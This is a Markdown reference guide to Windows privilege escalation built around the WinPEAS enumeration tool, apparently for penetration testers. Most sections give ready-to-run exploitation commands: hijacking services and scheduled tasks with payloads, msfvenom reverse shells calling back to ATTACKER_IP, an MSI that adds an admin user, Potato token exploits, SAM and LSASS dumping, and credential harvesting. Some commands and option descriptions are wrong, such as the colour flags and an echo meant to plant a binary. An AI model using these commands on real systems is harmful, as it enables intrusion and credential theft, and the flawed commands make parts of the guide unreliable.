# WinPEAS Checks Reference

This document details the privilege escalation checks performed by WinPEAS and how to interpret the findings.

## Table of Contents

- [Color-Coded Output](#color-coded-output)
- [Prioritizing Findings](#prioritizing-findings)
- [Service Misconfigurations](#service-misconfigurations)
- [Unquoted Service Paths](#unquoted-service-paths)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Stored Credentials](#stored-credentials)
- [Scheduled Tasks](#scheduled-tasks)
- [Token Privileges](#token-privileges)
- [Additional Checks](#additional-checks)

---

## Color-Coded Output

WinPEAS uses a color-coding system to indicate the severity and exploitability of findings:

| Color | Meaning | Priority |
|-------|---------|----------|
| **RED/YELLOW** | 95% chance of privilege escalation vector | Critical - Investigate immediately |
| **RED** | High-confidence misconfiguration or vulnerability | High - Strong privesc candidate |
| **YELLOW** | Potential interesting finding worth investigating | Medium - Review for exploitation |
| **GREEN** | Useful information for enumeration | Low - Informational |
| **CYAN** | Users with console access | Info - Note for later |
| **BLUE** | System information (neutral) | Info - Context only |
| **DARK GRAY** | Disabled or less relevant information | Info - Usually skip |

### Interpreting Colors

```
RED/YELLOW = Almost certainly exploitable (prioritize first)
RED        = Very likely exploitable (investigate second)
YELLOW     = Possibly exploitable (review third)
GREEN      = Useful info but not directly exploitable
```

### Command Line Color Options

```cmd
# Force colors even when output is redirected
winPEASx64.exe -linpeas

# Disable colors
winPEASx64.exe -lolbas

# No banner, less output
winPEASx64.exe quiet
```

---

## Prioritizing Findings

### Immediate Wins (Check First)

1. **RED/YELLOW findings** - These are almost always exploitable
2. **AlwaysInstallElevated** - Instant SYSTEM via MSI
3. **Unquoted service paths** with writable directories
4. **Modifiable service binaries** - Replace with payload
5. **Stored credentials** (Credential Manager, SAM, LSA)
6. **SeImpersonatePrivilege** - Potato attacks

### Secondary Checks

1. Weak service permissions (change service config)
2. Scheduled task misconfigurations
3. DLL hijacking opportunities
4. Registry AutoRun entries
5. Writable PATH directories

### Information Gathering

1. User information and group memberships
2. Installed software and patch levels
3. Network configuration
4. Running processes

---

## Service Misconfigurations

### What WinPEAS Checks

- Services with weak DACL (permissions)
- Modifiable service binaries
- Modifiable service registry entries
- Service accounts and their privileges
- Service dependencies

### Types of Service Misconfigurations

#### 1. Weak Service Permissions (DACL)

If current user can modify service configuration:

```cmd
# Check service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Vulnerable permissions to look for:
# SERVICE_ALL_ACCESS
# SERVICE_CHANGE_CONFIG
# SERVICE_START
# WRITE_DAC
# WRITE_OWNER
```

**Exploitation:**
```cmd
# Reconfigure service to run your payload
sc config VulnService binpath= "C:\temp\shell.exe"
sc config VulnService obj= ".\LocalSystem" password= ""

# Restart service
sc stop VulnService
sc start VulnService
```

#### 2. Weak Binary Permissions

If current user can modify the service executable:

```cmd
# Check binary permissions
icacls "C:\Path\To\Service.exe"

# Look for:
# (M) - Modify
# (F) - Full control
# (W) - Write
```

**Exploitation:**
```cmd
# Backup and replace
copy "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"
copy C:\temp\shell.exe "C:\Path\To\Service.exe"

# Restart service
sc stop VulnService
sc start VulnService
```

#### 3. Weak Registry Permissions

```cmd
# Check registry permissions
accesschk.exe -kvuqsw "HKLM\System\CurrentControlSet\Services" /accepteula

# Modify ImagePath
reg add "HKLM\System\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
```

### Manual Enumeration

```cmd
# List all services
sc query state= all

# Get service details
sc qc ServiceName

# Get service permissions
sc sdshow ServiceName
```

---

## Unquoted Service Paths

### What WinPEAS Checks

- Services with unquoted paths containing spaces
- Write permissions in path directories
- Potential hijack locations

### How Unquoted Paths Work

When Windows executes an unquoted path with spaces:

```
C:\Program Files\Vulnerable App\Service.exe
```

Windows tries these in order:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable App\Service.exe`

### Finding Vulnerable Services

```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell alternative
Get-WmiObject win32_service | Select-Object Name,PathName,StartMode | Where-Object {$_.PathName -notlike "C:\Windows\*" -and $_.PathName -notlike '"*'}
```

### Exploitation

```cmd
# Check write permissions on path directories
icacls "C:\Program Files\Vulnerable App\"

# If writable, place executable at hijack location
# Payload name must match the space-truncated path
copy C:\temp\shell.exe "C:\Program Files\Vulnerable.exe"

# Restart service (or wait for reboot)
sc stop VulnService
sc start VulnService
```

### Generating Payload

```bash
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

---

## AlwaysInstallElevated

### What WinPEAS Checks

- Registry keys for AlwaysInstallElevated policy
- Both HKLM and HKCU must be set to 1

### Understanding AlwaysInstallElevated

This Group Policy setting allows non-privileged users to install MSI packages with SYSTEM privileges. Both keys must be enabled:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

### Manual Check

```cmd
# Check registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must return: AlwaysInstallElevated    REG_DWORD    0x1
```

### Exploitation

```bash
# Generate malicious MSI (on Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Alternative: Add user to administrators
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
```

```cmd
# Execute on target (runs as SYSTEM)
msiexec /quiet /qn /i C:\temp\shell.msi

# Options:
# /quiet - Quiet mode, no user interaction
# /qn - No GUI
# /i - Install
```

---

## Stored Credentials

### What WinPEAS Checks

- Windows Credential Manager
- SAM and SYSTEM registry hives
- Cached credentials
- DPAPI protected credentials
- Unattended installation files
- Web browser saved passwords
- Application config files
- Registry-stored passwords

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Look for entries like:
# Target: Domain:interactive=DOMAIN\Administrator
# Type: Domain Password
```

**Exploitation with runas:**
```cmd
# If credentials are stored
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c C:\temp\shell.exe"

# For local admin
runas /savecred /user:Administrator cmd.exe
```

### SAM and SYSTEM Dump

```cmd
# If running as SYSTEM or have backup privileges
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# Copy to Kali and extract
secretsdump.py -sam sam -system system -security security LOCAL
```

### Unattended Installation Files

Common locations for plaintext/encoded passwords:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep\Unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\system32\sysprep\Panther\Unattend.xml
```

Password may be Base64 encoded:
```powershell
# Decode Base64 password
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UABhAHMAcwB3AG8AcgBkADEAMgAzACEA"))
```

### Group Policy Preferences (GPP)

```cmd
# Search for cpassword in SYSVOL (from domain-joined machine)
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml

# Decrypt GPP password
gpp-decrypt "encrypted_password_string"
```

### Registry Autologon

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

### WiFi Passwords

```cmd
# List saved WiFi profiles
netsh wlan show profiles

# Show password for specific profile
netsh wlan show profile name="WiFiName" key=clear
```

---

## Scheduled Tasks

### What WinPEAS Checks

- Scheduled tasks running as SYSTEM or Administrator
- Writable task executables
- Writable task directories (DLL hijacking)
- Tasks with modifiable permissions
- Tasks calling scripts/binaries with weak permissions

### Manual Enumeration

```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell (more detail)
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Get-ScheduledTaskInfo

# Check specific task
schtasks /query /tn "TaskName" /fo LIST /v
```

### Exploitation Vectors

#### 1. Writable Task Executable

```cmd
# Check permissions on task executable
icacls "C:\Path\To\Task.exe"

# If writable, replace with payload
copy C:\temp\shell.exe "C:\Path\To\Task.exe"
```

#### 2. Writable Task Script

```cmd
# If task runs a batch file or PowerShell script
echo C:\temp\shell.exe >> "C:\Path\To\Task.bat"
```

#### 3. DLL Hijacking via Task

```cmd
# If task executable loads DLLs from writable directory
# Use Process Monitor to identify missing DLLs
# Place malicious DLL in writable path
```

#### 4. Missing Binary

```cmd
# If scheduled task references non-existent binary
# Check if you can create file at that location
echo C:\temp\shell.exe > "C:\Expected\Path\Missing.exe"
```

### Task Permissions

```powershell
# Check task permissions
$task = Get-ScheduledTask -TaskName "TaskName"
$task.Principal.UserId  # Who it runs as
$task.Actions           # What it executes
```

---

## Token Privileges

### What WinPEAS Checks

- Current user's token privileges
- Privileges that enable privilege escalation
- Enabled vs disabled privileges

### Checking Privileges

```cmd
# List current privileges
whoami /priv

# PowerShell
[System.Security.Principal.WindowsIdentity]::GetCurrent().Token
```

### Exploitable Privileges

| Privilege | Impact | Exploitation Method |
|-----------|--------|---------------------|
| **SeImpersonatePrivilege** | Critical | Potato attacks (JuicyPotato, PrintSpoofer, etc.) |
| **SeAssignPrimaryTokenPrivilege** | Critical | Token manipulation |
| **SeTcbPrivilege** | Critical | Full token control |
| **SeBackupPrivilege** | High | Read any file (SAM, SYSTEM) |
| **SeRestorePrivilege** | High | Write any file |
| **SeTakeOwnershipPrivilege** | High | Take ownership of any file |
| **SeDebugPrivilege** | Critical | Inject into SYSTEM processes |
| **SeLoadDriverPrivilege** | High | Load vulnerable driver |
| **SeCreateTokenPrivilege** | Critical | Create arbitrary tokens |

### SeImpersonatePrivilege Exploits

This privilege is often granted to service accounts (IIS, SQL Server, etc.).

**PrintSpoofer (Windows 10/Server 2016+):**
```cmd
PrintSpoofer.exe -i -c "cmd /c C:\temp\shell.exe"
PrintSpoofer.exe -i -c "powershell.exe"
```

**GodPotato (Broad compatibility):**
```cmd
GodPotato.exe -cmd "cmd /c C:\temp\shell.exe"
```

**JuicyPotato (Windows 7/Server 2008-2016):**
```cmd
JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}

# Find CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

**RoguePotato (Windows 10/Server 2019):**
```cmd
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\shell.exe" -l 9999
```

### SeBackupPrivilege Exploitation

```cmd
# Copy SAM and SYSTEM
robocopy /b C:\Windows\System32\config C:\temp sam
robocopy /b C:\Windows\System32\config C:\temp system

# Or use diskshadow for NTDS.dit
```

### SeRestorePrivilege Exploitation

```cmd
# Replace protected files
robocopy /b C:\temp C:\Windows\System32 malicious.dll

# Modify utilman.exe for sticky keys attack
```

### SeDebugPrivilege Exploitation

```powershell
# Migrate to SYSTEM process
# Or dump LSASS memory
procdump.exe -ma lsass.exe lsass.dmp
```

---

## Additional Checks

### DLL Hijacking

```
WinPEAS checks for:
- Missing DLLs in application directories
- Writable PATH directories
- Applications loading DLLs from current directory
- Known DLL hijacking locations
```

**Common Hijackable DLLs:**
- VERSION.dll
- USERENV.dll
- NETAPI32.dll
- SAMLIB.dll

### AutoRun Registry Entries

```cmd
# Check AutoRun locations
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Check permissions on referenced binaries
```

### Installed Software

- Check versions against exploit-db
- Look for development/debug installations
- Find software with known vulnerabilities

### Network Shares

```cmd
# Enumerate shares
net share
net use

# Check for writable shares
# Look for sensitive files in shares
```

### Kernel Exploits

```cmd
# Check Windows version and patches
systeminfo
wmic qfe list

# Compare against known exploits
# Use Windows Exploit Suggester
```

---

## Quick Reference: WinPEAS Priority Order

1. Check RED/YELLOW findings first
2. Look for AlwaysInstallElevated
3. Check token privileges (SeImpersonate, SeDebug, etc.)
4. Review unquoted service paths
5. Check for modifiable services
6. Look for stored credentials
7. Review scheduled tasks
8. Check AutoRun binaries
9. Look for DLL hijacking opportunities
10. Check installed software versions

## Useful Commands Summary

```cmd
# Quick privilege checks
whoami /priv
whoami /groups

# Service enumeration
sc query state= all
wmic service get name,pathname,startmode

# Credential hunting
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Scheduled tasks
schtasks /query /fo LIST /v

# Network info
netstat -ano
ipconfig /all

# Installed software
wmic product get name,version
```

## References

- [HackTricks Windows Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)
- [Potato Attacks Comparison](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
